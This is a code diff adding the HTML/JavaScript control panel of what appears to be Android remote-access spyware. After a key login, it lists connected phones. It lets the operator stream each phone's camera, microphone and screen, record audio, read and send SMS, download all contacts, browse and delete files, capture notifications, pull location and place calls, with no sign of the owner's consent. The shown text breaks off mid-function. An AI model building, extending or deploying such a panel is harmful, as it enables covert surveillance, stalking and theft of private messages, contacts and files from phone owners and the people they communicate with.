@@ -1,0 +1,1138 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Dashboard</title>
+<script src="/socket.io/socket.io.js"></script>
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+:root {
+    --bg: #0a0a0f; --bg2: #12121a; --bg3: #1a1a2e; --bg4: #222240;
+    --accent: #00d4ff; --accent2: #7c3aed; --green: #22c55e; --red: #ef4444;
+    --text: #e2e8f0; --text2: #94a3b8; --border: #2d2d4a;
+}
+body { font-family: 'Segoe UI',system-ui,sans-serif; background: var(--bg); color: var(--text); min-height: 100vh; }
+
+/* Login */
+.login-container { display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+.login-box { background: var(--bg2); border: 1px solid var(--border); border-radius: 16px; padding: 40px; width: 400px; text-align: center; }
+.login-box h1 { color: var(--accent); margin-bottom: 8px; font-size: 28px; }
+.login-box p { color: var(--text2); margin-bottom: 24px; }
+.login-box input { width: 100%; padding: 12px 16px; background: var(--bg3); border: 1px solid var(--border); border-radius: 8px; color: var(--text); font-size: 16px; margin-bottom: 16px; outline: none; }
+.login-box input:focus { border-color: var(--accent); }
+.login-box button { width: 100%; padding: 12px; background: linear-gradient(135deg, var(--accent), var(--accent2)); border: none; border-radius: 8px; color: white; font-size: 16px; font-weight: 600; cursor: pointer; transition: .3s; }
+.login-box button:hover { transform: translateY(-2px); box-shadow: 0 4px 20px rgba(0,212,255,0.3); }
+
+/* Dashboard Layout */
+.dashboard { display: none; height: 100vh; }
+.sidebar { width: 280px; background: var(--bg2); border-right: 1px solid var(--border); display: flex; flex-direction: column; position: fixed; height: 100vh; z-index: 10; }
+.sidebar-header { padding: 16px; border-bottom: 1px solid var(--border); }
+.sidebar-header h2 { color: var(--accent); font-size: 18px; }
+.sidebar-header .key-info { color: var(--text2); font-size: 12px; margin-top: 4px; }
+.device-list { flex: 1; overflow-y: auto; padding: 8px; }
+.device-item { padding: 12px; border-radius: 8px; cursor: pointer; margin-bottom: 4px; transition: .2s; border: 1px solid transparent; }
+.device-item:hover { background: var(--bg3); }
+.device-item.active { background: var(--bg4); border-color: var(--accent); }
+.device-item .device-name { font-weight: 600; font-size: 14px; }
+.device-item .device-model { color: var(--text2); font-size: 12px; }
+.device-item .status-dot { display: inline-block; width: 8px; height: 8px; border-radius: 50%; margin-right: 6px; }
+.device-item .status-dot.online { background: var(--green); box-shadow: 0 0 6px var(--green); }
+.device-item .status-dot.offline { background: var(--red); }
+
+.main-content { margin-left: 280px; height: 100vh; display: flex; flex-direction: column; }
+
+/* Tabs */
+.tabs { display: flex; background: var(--bg2); border-bottom: 1px solid var(--border); overflow-x: auto; padding: 0 8px; flex-shrink: 0; }
+.tab { padding: 12px 16px; cursor: pointer; font-size: 13px; color: var(--text2); white-space: nowrap; border-bottom: 2px solid transparent; transition: .2s; }
+.tab:hover { color: var(--text); background: var(--bg3); }
+.tab.active { color: var(--accent); border-bottom-color: var(--accent); }
+
+/* Tab Content */
+.tab-content { flex: 1; overflow-y: auto; padding: 20px; display: none; }
+.tab-content.active { display: block; }
+
+/* Cards */
+.card { background: var(--bg2); border: 1px solid var(--border); border-radius: 12px; padding: 16px; margin-bottom: 16px; }
+.card h3 { color: var(--accent); margin-bottom: 12px; font-size: 16px; }
+
+/* Buttons */
+.btn { padding: 8px 16px; border: none; border-radius: 6px; cursor: pointer; font-size: 13px; font-weight: 500; transition: .2s; display: inline-flex; align-items: center; gap: 6px; }
+.btn-primary { background: var(--accent); color: var(--bg); }
+.btn-primary:hover { background: #00b8d9; }
+.btn-danger { background: var(--red); color: white; }
+.btn-danger:hover { background: #dc2626; }
+.btn-success { background: var(--green); color: white; }
+.btn-success:hover { background: #16a34a; }
+.btn-secondary { background: var(--bg4); color: var(--text); }
+.btn-secondary:hover { background: var(--border); }
+.btn-sm { padding: 4px 10px; font-size: 12px; }
+
+/* Stream Container */
+.stream-container { position: relative; background: #000; border-radius: 8px; overflow: hidden; text-align: center; }
+.stream-container img { max-width: 100%; height: auto; }
+.stream-controls { display: flex; gap: 8px; align-items: center; margin-top: 12px; flex-wrap: wrap; }
+select { padding: 8px 12px; background: var(--bg3); border: 1px solid var(--border); border-radius: 6px; color: var(--text); font-size: 13px; }
+
+/* Screen Controls */
+.screen-nav-btns { display: flex; gap: 8px; justify-content: center; margin-top: 12px; }
+.screen-nav-btns .btn { font-size: 18px; padding: 8px 20px; }
+
+/* Messages List */
+.msg-list { max-height: 500px; overflow-y: auto; }
+.msg-item { padding: 10px; border-bottom: 1px solid var(--border); }
+.msg-item .msg-addr { font-weight: 600; color: var(--accent); font-size: 13px; }
+.msg-item .msg-body { color: var(--text); font-size: 13px; margin-top: 4px; }
+.msg-item .msg-time { color: var(--text2); font-size: 11px; margin-top: 2px; }
+.msg-item .msg-type { display: inline-block; padding: 2px 6px; border-radius: 4px; font-size: 10px; font-weight: 600; }
+.msg-type.inbox { background: rgba(34,197,94,0.2); color: var(--green); }
+.msg-type.sent { background: rgba(0,212,255,0.2); color: var(--accent); }
+
+/* Send SMS */
+.sms-form { display: flex; gap: 8px; margin-bottom: 16px; flex-wrap: wrap; }
+.sms-form input, .sms-form textarea { padding: 8px 12px; background: var(--bg3); border: 1px solid var(--border); border-radius: 6px; color: var(--text); font-size: 13px; }
+.sms-form input { flex: 1; min-width: 200px; }
+.sms-form textarea { width: 100%; min-height: 60px; resize: vertical; }
+
+/* Contact List */
+.contact-list { max-height: 600px; overflow-y: auto; }
+.contact-item { display: flex; justify-content: space-between; align-items: center; padding: 10px; border-bottom: 1px solid var(--border); }
+.contact-item .contact-name { font-weight: 500; }
+.contact-item .contact-phone { color: var(--text2); font-size: 13px; }
+.contact-actions { display: flex; gap: 4px; }
+
+/* File Browser */
+.file-path { display: flex; align-items: center; gap: 8px; margin-bottom: 12px; flex-wrap: wrap; }
+.file-path span { color: var(--accent); font-size: 13px; word-break: break-all; }
+.file-list { max-height: 600px; overflow-y: auto; }
+.file-item { display: flex; justify-content: space-between; align-items: center; padding: 8px 12px; border-bottom: 1px solid var(--border); cursor: pointer; transition: .15s; }
+.file-item:hover { background: var(--bg3); }
+.file-item .file-icon { margin-right: 8px; font-size: 16px; }
+.file-item .file-name { flex: 1; font-size: 13px; }
+.file-item .file-size { color: var(--text2); font-size: 12px; margin: 0 12px; }
+.file-item .file-actions { display: flex; gap: 4px; }
+
+/* Image Preview Modal */
+.modal-overlay { display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.8); z-index: 100; justify-content: center; align-items: center; }
+.modal-overlay.active { display: flex; }
+.modal-content { background: var(--bg2); border-radius: 12px; padding: 20px; max-width: 90%; max-height: 90%; overflow: auto; }
+.modal-content img { max-width: 100%; border-radius: 8px; }
+.modal-close { position: absolute; top: 20px; right: 20px; font-size: 28px; color: white; cursor: pointer; background: rgba(0,0,0,0.5); width: 40px; height: 40px; border-radius: 50%; display: flex; align-items: center; justify-content: center; }
+
+/* Apps List */
+.app-list { max-height: 600px; overflow-y: auto; }
+.app-item { display: flex; align-items: center; padding: 10px; border-bottom: 1px solid var(--border); gap: 12px; }
+.app-item img { width: 36px; height: 36px; border-radius: 8px; }
+.app-item .app-name { flex: 1; }
+.app-item .app-name span { display: block; font-size: 13px; font-weight: 500; }
+.app-item .app-name small { color: var(--text2); font-size: 11px; }
+.app-item .badge { padding: 2px 6px; border-radius: 4px; font-size: 10px; margin-right: 8px; }
+.badge.playstore { background: rgba(34,197,94,0.2); color: var(--green); }
+.badge.system { background: rgba(239,68,68,0.2); color: var(--red); }
+
+/* Notifications */
+.notif-list { max-height: 500px; overflow-y: auto; }
+.notif-item { padding: 10px; border-bottom: 1px solid var(--border); }
+.notif-item .notif-app { color: var(--accent); font-size: 12px; font-weight: 600; }
+.notif-item .notif-title { font-weight: 500; font-size: 14px; margin-top: 2px; }
+.notif-item .notif-text { color: var(--text2); font-size: 13px; margin-top: 2px; }
+.notif-item .notif-time { color: var(--text2); font-size: 11px; margin-top: 4px; }
+
+/* Device Info Grid */
+.info-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(250px, 1fr)); gap: 12px; }
+.info-card { background: var(--bg3); border-radius: 8px; padding: 16px; }
+.info-card .info-label { color: var(--text2); font-size: 12px; text-transform: uppercase; letter-spacing: 1px; }
+.info-card .info-value { font-size: 18px; font-weight: 600; margin-top: 4px; color: var(--accent); }
+
+/* Remote Control */
+.remote-form { display: flex; gap: 8px; margin-bottom: 12px; flex-wrap: wrap; }
+.remote-form input { flex: 1; padding: 8px 12px; background: var(--bg3); border: 1px solid var(--border); border-radius: 6px; color: var(--text); min-width: 200px; }
+
+/* Audio Spectrum */
+.audio-spectrum { width: 100%; height: 60px; background: var(--bg3); border-radius: 8px; margin-top: 8px; }
+
+/* Search */
+.search-box { width: 100%; padding: 10px 14px; background: var(--bg3); border: 1px solid var(--border); border-radius: 8px; color: var(--text); margin-bottom: 12px; font-size: 14px; outline: none; }
+.search-box:focus { border-color: var(--accent); }
+
+/* Audio recordings */
+.recording-list { max-height: 300px; overflow-y: auto; }
+.recording-item { display: flex; justify-content: space-between; align-items: center; padding: 8px; border-bottom: 1px solid var(--border); }
+
+/* Progress bar */
+.progress-bar { width: 100%; height: 6px; background: var(--bg3); border-radius: 3px; overflow: hidden; margin-top: 8px; }
+.progress-bar .fill { height: 100%; background: var(--accent); transition: width .3s; border-radius: 3px; }
+
+/* Scrollbar */
+::-webkit-scrollbar { width: 6px; }
+::-webkit-scrollbar-track { background: var(--bg); }
+::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
+::-webkit-scrollbar-thumb:hover { background: var(--accent); }
+
+/* No device selected */
+.no-device { display: flex; justify-content: center; align-items: center; height: 100%; color: var(--text2); font-size: 18px; }
+</style>
+</head>
+<body>
+
+<!-- Login Screen -->
+<div class="login-container" id="loginScreen">
+    <div class="login-box">
+        <h1>Dashboard</h1>
+        <p>Enter your device key to access</p>
+        <input type="text" id="keyInput" placeholder="Enter device key..." autofocus>
+        <button onclick="connectWithKey()">Connect</button>
+    </div>
+</div>
+
+<!-- Dashboard -->
+<div class="dashboard" id="dashboard" style="display:none">
+    <div style="display:flex;height:100vh">
+        <!-- Sidebar -->
+        <div class="sidebar">
+            <div class="sidebar-header">
+                <h2>Dashboard</h2>
+                <div class="key-info">Key: <span id="currentKey"></span></div>
+            </div>
+            <div class="device-list" id="deviceList">
+                <p style="padding:16px;color:var(--text2);text-align:center">No devices connected</p>
+            </div>
+        </div>
+
+        <!-- Main Content -->
+        <div class="main-content">
+            <div id="noDevice" class="no-device">
+                <div style="text-align:center">
+                    <div style="font-size:48px;margin-bottom:16px">📱</div>
+                    <div>Select a device to begin</div>
+                </div>
+            </div>
+
+            <div id="devicePanel" style="display:none;height:100%;display:none;flex-direction:column">
+                <!-- Tabs -->
+                <div class="tabs">
+                    <div class="tab active" data-tab="camera" onclick="switchTab('camera')">📷 Camera</div>
+                    <div class="tab" data-tab="audio" onclick="switchTab('audio')">🎤 Microphone</div>
+                    <div class="tab" data-tab="screen" onclick="switchTab('screen')">🖥️ Screen</div>
+                    <div class="tab" data-tab="messages" onclick="switchTab('messages')">💬 Messages</div>
+                    <div class="tab" data-tab="contacts" onclick="switchTab('contacts')">📇 Contacts</div>
+                    <div class="tab" data-tab="files" onclick="switchTab('files')">📁 Files</div>
+                    <div class="tab" data-tab="apps" onclick="switchTab('apps')">📱 Apps</div>
+                    <div class="tab" data-tab="notifications" onclick="switchTab('notifications')">🔔 Notifications</div>
+                    <div class="tab" data-tab="remote" onclick="switchTab('remote')">🎮 Remote</div>
+                    <div class="tab" data-tab="info" onclick="switchTab('info')">ℹ️ Info</div>
+                </div>
+
+                <!-- Camera Tab -->
+                <div class="tab-content active" id="tab-camera">
+                    <div class="card">
+                        <h3>📷 Live Camera</h3>
+                        <div class="stream-controls">
+                            <select id="cameraSelect">
+                                <option value="back">Back Camera</option>
+                                <option value="front">Front Camera</option>
+                            </select>
+                            <select id="cameraQuality">
+                                <option value="100">100% Quality</option>
+                                <option value="70" selected>70% Quality</option>
+                                <option value="50">50% Quality</option>
+                                <option value="30">30% Quality</option>
+                            </select>
+                            <button class="btn btn-success" onclick="startCamera()">▶ Start</button>
+                            <button class="btn btn-danger" onclick="stopCamera()">⬛ Stop</button>
+                        </div>
+                        <div class="stream-container" style="margin-top:12px">
+                            <img id="cameraStream" style="display:none;max-height:70vh" />
+                            <p id="cameraPlaceholder" style="padding:60px;color:var(--text2)">Camera stream will appear here</p>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Audio Tab -->
+                <div class="tab-content" id="tab-audio">
+                    <div class="card">
+                        <h3>🎤 Live Audio</h3>
+                        <div class="stream-controls">
+                            <button class="btn btn-success" onclick="startAudio()">▶ Listen</button>
+                            <button class="btn btn-danger" onclick="stopAudio()">⬛ Stop</button>
+                            <button class="btn btn-primary" onclick="startAudioRecord()">⏺ Record</button>
+                            <button class="btn btn-danger" onclick="stopAudioRecord()">⏹ Stop Record</button>
+                        </div>
+                        <canvas id="audioSpectrum" class="audio-spectrum" style="margin-top:12px"></canvas>
+                        <p id="audioStatus" style="margin-top:8px;color:var(--text2);font-size:13px">Audio inactive</p>
+                    </div>
+                    <div class="card">
+                        <h3>📼 Saved Recordings</h3>
+                        <button class="btn btn-secondary btn-sm" onclick="loadRecordings()" style="margin-bottom:12px">🔄 Refresh</button>
+                        <div class="recording-list" id="recordingList">
+                            <p style="color:var(--text2);font-size:13px">No recordings yet</p>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Screen Tab -->
+                <div class="tab-content" id="tab-screen">
+                    <div class="card">
+                        <h3>🖥️ Live Screen</h3>
+                        <div class="stream-controls">
+                            <select id="screenQuality">
+                                <option value="100">100% Quality</option>
+                                <option value="70" selected>70% Quality</option>
+                                <option value="50">50% Quality</option>
+                                <option value="30">30% Quality</option>
+                            </select>
+                            <button class="btn btn-success" onclick="startScreen()">▶ Start</button>
+                            <button class="btn btn-danger" onclick="stopScreen()">⬛ Stop</button>
+                        </div>
+                        <div class="stream-container" style="margin-top:12px;cursor:crosshair" id="screenContainer">
+                            <img id="screenStream" style="display:none;max-height:70vh;touch-action:none" />
+                            <p id="screenPlaceholder" style="padding:60px;color:var(--text2)">Screen stream will appear here</p>
+                        </div>
+                        <div class="screen-nav-btns">
+                            <button class="btn btn-secondary" onclick="pressBack()">◀ Back</button>
+                            <button class="btn btn-secondary" onclick="pressHome()">⚫ Home</button>
+                            <button class="btn btn-secondary" onclick="pressRecents()">☐ Recent</button>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Messages Tab -->
+                <div class="tab-content" id="tab-messages">
+                    <div class="card">
+                        <h3>💬 Send SMS</h3>
+                        <div class="sms-form">
+                            <input type="text" id="smsPhone" placeholder="Phone number...">
+                            <textarea id="smsMessage" placeholder="Message..."></textarea>
+                            <button class="btn btn-primary" onclick="sendSms()">📤 Send</button>
+                        </div>
+                    </div>
+                    <div class="card">
+                        <h3>📥 Messages</h3>
+                        <button class="btn btn-secondary btn-sm" onclick="loadSms()" style="margin-bottom:12px">🔄 Load Messages</button>
+                        <div class="msg-list" id="smsList"></div>
+                    </div>
+                </div>
+
+                <!-- Contacts Tab -->
+                <div class="tab-content" id="tab-contacts">
+                    <div class="card">
+                        <h3>📇 Contacts</h3>
+                        <div style="display:flex;gap:8px;margin-bottom:12px">
+                            <button class="btn btn-secondary btn-sm" onclick="loadContacts()">🔄 Load</button>
+                            <button class="btn btn-primary btn-sm" onclick="downloadContacts()">📥 Download All</button>
+                        </div>
+                        <input type="text" class="search-box" id="contactSearch" placeholder="Search contacts..." oninput="filterContacts()">
+                        <div class="contact-list" id="contactList"></div>
+                    </div>
+                </div>
+
+                <!-- Files Tab -->
+                <div class="tab-content" id="tab-files">
+                    <div class="card">
+                        <h3>📁 File Manager</h3>
+                        <div class="file-path">
+                            <button class="btn btn-secondary btn-sm" onclick="goParentDir()">⬆ Up</button>
+                            <span id="currentPath">/</span>
+                            <button class="btn btn-secondary btn-sm" onclick="browseFiles(currentFilePath)">🔄</button>
+                            <label class="btn btn-primary btn-sm" style="cursor:pointer">
+                                📤 Upload
+                                <input type="file" id="fileUploadInput" style="display:none" onchange="uploadFile()">
+                            </label>
+                        </div>
+                        <div id="uploadProgress" style="display:none">
+                            <p style="font-size:13px;color:var(--text2)">Uploading...</p>
+                            <div class="progress-bar"><div class="fill" id="uploadFill" style="width:0%"></div></div>
+                        </div>
+                        <div id="downloadProgress" style="display:none">
+                            <p style="font-size:13px;color:var(--text2)">Downloading... <span id="downloadPercent">0%</span></p>
+                            <div class="progress-bar"><div class="fill" id="downloadFill" style="width:0%"></div></div>
+                        </div>
+                        <div class="file-list" id="fileList"></div>
+                    </div>
+                </div>
+
+                <!-- Apps Tab -->
+                <div class="tab-content" id="tab-apps">
+                    <div class="card">
+                        <h3>📱 Installed Apps</h3>
+                        <button class="btn btn-secondary btn-sm" onclick="loadApps()" style="margin-bottom:12px">🔄 Load Apps</button>
+                        <input type="text" class="search-box" id="appSearch" placeholder="Search apps..." oninput="filterApps()">
+                        <div class="app-list" id="appList"></div>
+                    </div>
+                </div>
+
+                <!-- Notifications Tab -->
+                <div class="tab-content" id="tab-notifications">
+                    <div class="card">
+                        <h3>🔔 Live Notifications</h3>
+                        <button class="btn btn-danger btn-sm" onclick="clearNotifications()" style="margin-bottom:12px">🗑 Clear</button>
+                        <div class="notif-list" id="notifList">
+                            <p style="color:var(--text2);font-size:13px">Waiting for notifications...</p>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Remote Tab -->
+                <div class="tab-content" id="tab-remote">
+                    <div class="card">
+                        <h3>📢 Toast Message</h3>
+                        <div class="remote-form">
+                            <input type="text" id="toastMsg" placeholder="Enter message...">
+                            <button class="btn btn-primary" onclick="showToast()">Show</button>
+                        </div>
+                    </div>
+                    <div class="card">
+                        <h3>🌐 Open URL</h3>
+                        <div class="remote-form">
+                            <input type="text" id="remoteUrl" placeholder="https://..." value="https://">
+                            <button class="btn btn-primary" onclick="openUrl()">Open</button>
+                        </div>
+                    </div>
+                    <div class="card">
+                        <h3>📞 Make Call</h3>
+                        <div class="remote-form">
+                            <input type="text" id="callNumber" placeholder="Phone number...">
+                            <button class="btn btn-success" onclick="makeCall()">📞 Call</button>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Info Tab -->
+                <div class="tab-content" id="tab-info">
+                    <div class="card">
+                        <h3>ℹ️ Device Information</h3>
+                        <button class="btn btn-secondary btn-sm" onclick="loadDeviceInfo()" style="margin-bottom:12px">🔄 Refresh</button>
+                        <div class="info-grid" id="infoGrid"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Image Preview Modal -->
+<div class="modal-overlay" id="imageModal">
+    <div class="modal-close" onclick="closeImageModal()">✕</div>
+    <div class="modal-content">
+        <img id="previewImage" />
+    </div>
+</div>
+
+<script>
+let socket;
+let currentKey = '';
+let selectedDevice = null;
+let infoInterval = null;
+
+// Devices that are waiting to be hidden
+const offlineHideTimers = {};
+
+// Devices hidden from sidebar only
+const hiddenDevices = {};
+
+let currentFilePath = '/';
+let allContacts = [];
+let allApps = [];
+let phoneWidth = 0, phoneHeight = 0;
+let audioContext, analyser, audioDataArray;
+let spectrumAnimationId;
+
+// Connect with key
+function connectWithKey() {
+    const key = document.getElementById('keyInput').value.trim();
+    if (!key) return alert('Please enter a key');
+    currentKey = key;
+    document.getElementById('currentKey').textContent = key;
+    document.getElementById('loginScreen').style.display = 'none';
+    document.getElementById('dashboard').style.display = 'block';
+
+    socket = io(window.location.origin, {
+        transports: ['websocket', 'polling'],
+        reconnection: true,
+        reconnectionAttempts: Infinity,
+        reconnectionDelay: 1000
+    });
+
+    socket.on('connect', () => {
+        socket.emit('register_dashboard', { key: currentKey });
+    });
+
+    socket.on('device_list', (data) => {
+        renderDevices(data.devices);
+    });
+
+    // Camera
+    socket.on('camera_frame', (data) => {
+        const img = document.getElementById('cameraStream');
+        img.src = 'data:image/jpeg;base64,' + data.frame;
+        img.style.display = 'block';
+        document.getElementById('cameraPlaceholder').style.display = 'none';
+    });
+
+    // Audio
+    socket.on('audio_frame', (data) => {
+        playAudioChunk(data.audio, data.sampleRate);
+        document.getElementById('audioStatus').textContent = '🔊 Listening...';
+    });
+
+    socket.on('audio_record_status', (data) => {
+        document.getElementById('audioStatus').textContent = '⏺ Recording...';
+    });
+
+    socket.on('audio_saved', (data) => {
+        document.getElementById('audioStatus').textContent = '✅ Recording saved: ' + data.fileName;
+        loadRecordings();
+    });
+
+    socket.on('audio_recording_complete', () => {
+        document.getElementById('audioStatus').textContent = '✅ Recording complete & saved';
+        loadRecordings();
+    });
+
+    // Screen
+    socket.on('screen_frame', (data) => {
+        const img = document.getElementById('screenStream');
+        img.src = 'data:image/jpeg;base64,' + data.frame;
+        img.style.display = 'block';
+        document.getElementById('screenPlaceholder').style.display = 'none';
+        phoneWidth = data.width;
+        phoneHeight = data.height;
+    });
+
+    // SMS
+    socket.on('sms_list', (data) => renderSms(data.messages));
+    socket.on('sms_sent', (data) => {
+        alert(data.status === 'sent' ? 'SMS sent!' : 'Error: ' + data.error);
+    });
+
+    // Contacts
+    socket.on('contacts_list', (data) => {
+        allContacts = data.contacts;
+        renderContacts(data.contacts);
+    });
+    socket.on('contacts_download', (data) => {
+        downloadBase64File(data.data, data.fileName, 'text/plain');
+    });
+
+    // Files
+    socket.on('file_list', (data) => {
+        currentFilePath = data.currentPath;
+        document.getElementById('currentPath').textContent = data.currentPath;
+        renderFiles(data.files);
+    });
+    socket.on('file_download_chunk', (data) => {
+        const pct = Math.round((data.sentSize / data.totalSize) * 100);
+        document.getElementById('downloadProgress').style.display = 'block';
+        document.getElementById('downloadPercent').textContent = pct + '%';
+        document.getElementById('downloadFill').style.width = pct + '%';
+        if (data.done) {
+            setTimeout(() => {
+                document.getElementById('downloadProgress').style.display = 'none';
+            }, 2000);
+        }
+    });
+    socket.on('image_preview', (data) => {
+        document.getElementById('previewImage').src = 'data:image/jpeg;base64,' + data.image;
+        document.getElementById('imageModal').classList.add('active');
+    });
+    socket.on('file_deleted', (data) => {
+        if (data.deleted) browseFiles(currentFilePath);
+    });
+    socket.on('file_uploaded', (data) => {
+        document.getElementById('uploadProgress').style.display = 'none';
+        if (data.status === 'success') browseFiles(currentFilePath);
+    });
+
+    // Apps
+    socket.on('apps_list', (data) => {
+        allApps = data.apps;
+        renderApps(data.apps);
+    });
+
+    // Notifications
+    socket.on('phone_notification', (data) => addNotification(data));
+
+    // Device Info
+    socket.on('device_info', (data) => renderDeviceInfo(data));
+    socket.on('location_data', (data) => renderLocation(data));
+
+    // Enter key
+    document.getElementById('keyInput').addEventListener('keypress', (e) => {
+        if (e.key === 'Enter') connectWithKey();
+    });
+
+    // Screen touch events
+    setupScreenTouch();
+}
+
+function renderDevices(deviceList) {
+    const container = document.getElementById('deviceList');
+
+    // Process online/offline state
+    deviceList.forEach(d => {
+
+        // Device came back online
+        if (d.online) {
+            // Cancel pending hide timer
+            if (offlineHideTimers[d.deviceId]) {
+                clearTimeout(offlineHideTimers[d.deviceId]);
+                delete offlineHideTimers[d.deviceId];
+            }
+
+            // Show device again
+            delete hiddenDevices[d.deviceId];
+        }
+
+        // Device went offline
+        else {
+            // Start 5-second hide timer only once
+            if (!offlineHideTimers[d.deviceId] && !hiddenDevices[d.deviceId]) {
+
+                offlineHideTimers[d.deviceId] = setTimeout(() => {
+
+                    // Hide only from sidebar
+                    hiddenDevices[d.deviceId] = true;
+
+                    delete offlineHideTimers[d.deviceId];
+
+                    // Re-render sidebar
+                    renderDevices(deviceList);
+
+                }, 5000);
+            }
+        }
+    });
+
+    // Only display devices that are not hidden
+    const visibleDevices = deviceList.filter(d => {
+        return !hiddenDevices[d.deviceId];
+    });
+
+    if (!visibleDevices.length) {
+        container.innerHTML =
+            '<p style="padding:16px;color:var(--text2);text-align:center">No devices found for this key</p>';
+        return;
+    }
+
+    container.innerHTML = visibleDevices.map(d => `
+        <div class="device-item ${selectedDevice === d.deviceId ? 'active' : ''}"
+             onclick="selectDevice('${d.deviceId}')">
+
+            <span class="status-dot ${d.online ? 'online' : 'offline'}"></span>
+
+            <span class="device-name">${d.deviceName}</span>
+
+            <div class="device-model">
+                ${d.model} • Android ${d.androidVersion}
+            </div>
+
+        </div>
+    `).join('');
+}
+
+function selectDevice(deviceId) {
+    selectedDevice = deviceId;
+    socket.emit('select_device', { deviceId });
+    document.getElementById('noDevice').style.display = 'none';
+    document.getElementById('devicePanel').style.display = 'flex';
+    document.querySelectorAll('.device-item').forEach(el => el.classList.remove('active'));
+    event.currentTarget.classList.add('active');
+
+    // Stop all streams
+    stopCamera(); stopAudio(); stopScreen();
+}
+
+function switchTab(tab) {
+    // Switch active tab UI
+    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+    document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
+    document.querySelector(`[data-tab="${tab}"]`).classList.add('active');
+    document.getElementById('tab-' + tab).classList.add('active');
+
+    // Stop info auto-refresh when leaving Info tab
+    if (infoInterval) {
+        clearInterval(infoInterval);
+        infoInterval = null;
+    }
+
+    // Auto refresh when opening these tabs
+    if (selectedDevice) {
+        if (tab === 'messages') {
+            loadSms();                    // auto load messages
+        } else if (tab === 'contacts') {
+            loadContacts();               // auto load contacts
+        } else if (tab === 'files') {
+            browseFiles(currentFilePath); // auto load files
+        } else if (tab === 'apps') {
+            loadApps();                   // auto load apps
+        } else if (tab === 'info') {
+            loadDeviceInfo();             // load immediately
+            infoInterval = setInterval(loadDeviceInfo, 15000); // then every 5 sec
+        }
+    }
+}
+
+// Camera
+function startCamera() {
+    socket.emit('start_camera', {
+        camera: document.getElementById('cameraSelect').value,
+        quality: parseInt(document.getElementById('cameraQuality').value)
+    });
+}
+function stopCamera() {
+    socket.emit('stop_camera');
+    document.getElementById('cameraStream').style.display = 'none';
+    document.getElementById('cameraPlaceholder').style.display = 'block';
+}
+
+// Audio
+function startAudio() {
+    socket.emit('start_audio');
+    document.getElementById('audioStatus').textContent = '🔊 Starting...';
+    initAudioSpectrum();
+}
+function stopAudio() {
+    socket.emit('stop_audio');
+    document.getElementById('audioStatus').textContent = 'Audio inactive';
+    if (spectrumAnimationId) cancelAnimationFrame(spectrumAnimationId);
+}
+function startAudioRecord() { socket.emit('start_audio_record'); }
+function stopAudioRecord() { socket.emit('stop_audio_record'); }
+
+function playAudioChunk(base64, sampleRate) {
+    try {
+        if (!audioContext) {
+            audioContext = new (window.AudioContext || window.webkitAudioContext)({ sampleRate: sampleRate || 16000 });
+            analyser = audioContext.createAnalyser();
+            analyser.fftSize = 256;
+            audioDataArray = new Uint8Array(analyser.frequencyBinCount);
+        }
+        const raw = atob(base64);
+        const bytes = new Int16Array(raw.length / 2);
+        for (let i = 0; i < bytes.length; i++) {
+            bytes[i] = raw.charCodeAt(i * 2) | (raw.charCodeAt(i * 2 + 1) << 8);
+        }
+        const floats = new Float32Array(bytes.length);
+        for (let i = 0; i < bytes.length; i++) {
+            floats[i] = bytes[i] / 32768;
+        }
+        const buffer = audioContext.createBuffer(1, floats.length, sampleRate || 16000);
+        buffer.getChannelData(0).set(floats);
+        const source = audioContext.createBufferSource();
+        source.buffer = buffer;
+        source.connect(analyser);
+        analyser.connect(audioContext.destination);
+        source.start();
+    } catch(e) {}
+}
+
+function initAudioSpectrum() {
+    const canvas = document.getElementById('audioSpectrum');
+    const ctx = canvas.getContext('2d');
+    canvas.width = canvas.offsetWidth;
+    canvas.height = canvas.offsetHeight;
+
+    function draw() {
+        spectrumAnimationId = requestAnimationFrame(draw);
+        if (!analyser) return;
+        analyser.getByteFrequencyData(audioDataArray);
+        ctx.fillStyle = '#1a1a2e';
+        ctx.fillRect(0, 0, canvas.width, canvas.height);
+        const barW = (canvas.width / audioDataArray.length) * 2.5;
+        let x = 0;
+        for (let i = 0; i < audioDataArray.length; i++) {
+            const barH = (audioDataArray[i] / 255) * canvas.height;
+            const hue = (i / audioDataArray.length) * 180 + 180;
+            ctx.fillStyle = `hsl(${hue}, 80%, 60%)`;
+            ctx.fillRect(x, canvas.height - barH, barW, barH);
+            x += barW + 1;
+        }
+    }
+    draw();
+}
+
+function loadRecordings() {
+    if (!selectedDevice) return;
+    const deviceName = document.querySelector('.device-item.active .device-name')?.textContent || '';
+    fetch(`/api/recordings/${encodeURIComponent(deviceName)}`)
+        .then(r => r.json())
+        .then(data => {
+            const list = document.getElementById('recordingList');
+            if (!data.files.length) {
+                list.innerHTML = '<p style="color:var(--text2);font-size:13px">No recordings</p>';
+                return;
+            }
+            list.innerHTML = data.files.map(f => `
+                <div class="recording-item">
+                    <div>
+                        <div style="font-size:13px">${f.name}</div>
+                        <div style="font-size:11px;color:var(--text2)">${formatSize(f.size)} • ${new Date(f.date).toLocaleString()}</div>
+                    </div>
+                    <div style="display:flex;gap:4px">
+                        <button class="btn btn-sm btn-primary" onclick="playRecording('${deviceName}','${f.name}')">▶</button>
+                        <a class="btn btn-sm btn-success" href="/download/${encodeURIComponent(deviceName)}/Audio/${f.name}" download>📥</a>
+                        <button class="btn btn-sm btn-danger" onclick="deleteRecording('${deviceName}','${f.name}')">🗑</button>
+                    </div>
+                </div>
+            `).join('');
+        });
+}
+
+function playRecording(device, file) {
+    const audio = new Audio(`/download/${encodeURIComponent(device)}/Audio/${file}`);
+    audio.play();
+}
+
+function deleteRecording(device, file) {
+    if (!confirm('Delete ' + file + '?')) return;
+    fetch(`/api/recordings/${encodeURIComponent(device)}/${file}`, { method: 'DELETE' })
+        .then(() => loadRecordings());
